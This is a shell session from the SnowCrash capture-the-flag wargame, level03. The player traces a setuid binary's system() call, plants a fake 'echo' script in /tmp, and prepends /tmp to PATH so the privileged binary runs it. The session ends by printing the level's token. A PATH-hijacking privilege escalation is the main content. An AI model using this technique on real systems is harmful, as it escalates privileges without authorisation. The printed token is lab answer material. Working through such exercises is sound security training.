
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                = 2003
geteuid()                                                                                = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                      = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                      = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                   = 0
+++ exited (status 0) +++
level03@SnowCrash:~$ ps
  PID TTY          TIME CMD
 3154 pts/0    00:00:00 su
 3161 pts/0    00:00:00 bash
 3399 pts/0    00:00:00 ps
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:/tmp$ vim echo
level03@SnowCrash:/tmp$ ls
ls: cannot open directory .: Permission denied
level03@SnowCrash:/tmp$ cat > /tmp/echo <<'EOF'
> echo "Hijacked echo called with: $@"
> getflag
> EOF
level03@SnowCrash:/tmp$ chmod +x /tmp/echo
level03@SnowCrash:/tmp$ PATH=/tmp:$PATH ./level03
bash: ./level03: No such file or directory
level03@SnowCrash:/tmp$ PATH=/tmp:$PATH
level03@SnowCrash:/tmp$ cd ~
level03@SnowCrash:~$ ./level03
Hijacked echo called with: Exploit me
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$
